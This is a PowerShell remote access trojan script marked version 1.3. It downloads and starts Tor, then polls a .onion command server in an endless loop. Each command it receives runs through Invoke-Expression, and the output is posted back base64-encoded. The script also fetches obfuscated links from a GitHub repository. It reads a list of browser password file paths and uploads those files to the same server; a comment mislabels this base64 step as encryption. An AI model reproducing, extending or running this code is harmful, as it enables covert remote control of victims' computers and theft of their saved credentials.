## VERSION 1.3

$log = "C:\Users\Public\log.txt"
$zip = "C:\Users\Public\link.zip"
$extract = "C:\Users\Public\Extract"
$url = "http://ld52qe2n47otqd63u4jqv26yyev64z2jucgidqisriv7x3fxuoetfjid.onion"
$orConfigPath = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/config" | Select-Object -ExpandProperty Content
$deConfigPath = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($orConfigPath))
$tLink = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/link" | Select-Object -ExpandProperty Content
$oLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tLink))
$orTestLink = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/test" | Select-Object -ExpandProperty Content
$deTestLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($orTestLink))
$testFilePath = "$extract\test.py"


# Downloads from GitHub
function download {
    if (Test-Path $extract) {
        "Already downloaded. Skipping..." | Out-File -Append -FilePath $log
    } else {
        "DEBUG : $oLink" | Out-File -Append -FilePath $log
        "Downloading tar.gz..." | Out-File -Append -FilePath $log
        
        Invoke-WebRequest -Uri $oLink -OutFile $zip

        if (Test-Path $zip) {
            if (-not (Test-Path $extract)) {
                New-Item -ItemType Directory -Path $extract | Out-Null
            }

            tar -xf $zip -C $extract
            "Cleaning archive" | Out-File -FilePath $log -Append
            Remove-Item $zip
        } else {
            "Failed to download archive." | Out-File -FilePath $log -Append
        }
    }
}


# Sets port in config file
function writeConfig {
    if (!(Test-Path $deConfigPath)) {
        "SOCKSPort 9050" | Out-File -FilePath $deConfigPath -Encoding ascii
    }
}

# Starts T
function startTor {
    Start-Process -FilePath "$extract\Tor\tor.exe" -ArgumentList "-f $deConfigPath" -WindowStyle Normal
}

# Waits for T
function waitForTor {
    do {
        Start-Sleep -Seconds 3
        $ready = Test-NetConnection -ComputerName 127.0.0.1 -Port 9050
    } until ($ready.TcpTestSucceeded)
    "Tor connection established." | Out-File -Append -FilePath $log
}

function main {
    try {
        $cmd = & curl.exe --socks5-hostname 127.0.0.1:9050 "$url/get"
        "$((Get-Date).ToString()) - Command received: $cmd" | Out-File -Append -FilePath $log

        if ($cmd -and $cmd -ne "noop") {
            try {
                # Capture output including errors and noop
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $output = ($output -split "`r?`n" | Where-Object { $_.Trim() -ne "" }) -join "`n"
                $outText = "SUCCESS:`n$output"
                $outText | Out-File -Append -FilePath $log
                $eOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($outText))
                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" -d $eOutput "$url/report"
            }
            catch {
                $err = "ERROR: $($_.Exception.Message)"
                $err | Out-File -Append -FilePath $log

                $eErr = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($err))
                & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" -d $eErr "$url/report"
            }
        }
    }
    catch {
        "ERROR: $($_.Exception.Message)" | Out-File -Append -FilePath $log
    }
    Start-Sleep -Seconds 5
}

function testPython {
    python test.py
    
    # Sets Json path
    $jsonPath = "C:\Users\Public\browser_pw_paths.json"
    if (Test-Path $jsonPath) {
        # Converts from Json
        $json = Get-Content $jsonPath | ConvertFrom-Json

        foreach ($entry in $json.PSObject.Properties) {
            $path = $entry.Value
            if ($path) {
                sendLogs $path
            }
        }
    } else {
        "Log paths JSON not found at $jsonpath" | Out-File -Append -FilePath $log
    }
}

function sendLogs($logsPath) {
    if (Test-Path $logsPath) {
        # Encrypts data for security
        $bytes = [System.IO.File]::ReadAllBytes($logsPath)
        $protected = [Convert]::ToBase64String($bytes)

        "Sending encoded data (first 100 chars): $($protected.Substring(0,100))..." | Out-File -Append -FilePath $log

        # Writes base64 string to a temp file
        $tempDataFile = "$env:TEMP\curl_data.txt"
        Set-Content -Path $tempDataFile -Value $protected -Encoding ascii

        # Logs data to server
        "Logging $logsPath to server..." | Out-File -Append -FilePath $log
        & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" --data "@$tempDataFile" "$url/report"

        # Quitely remove temp file
        Remove-Item $tempDataFile -ErrorAction SilentlyContinue
    } else {
        "Log $logsPath not found" | Out-File -Append -FilePath $log
    }
}

download
writeConfig
startTor
waitForTor

while ($true) {
    main
}
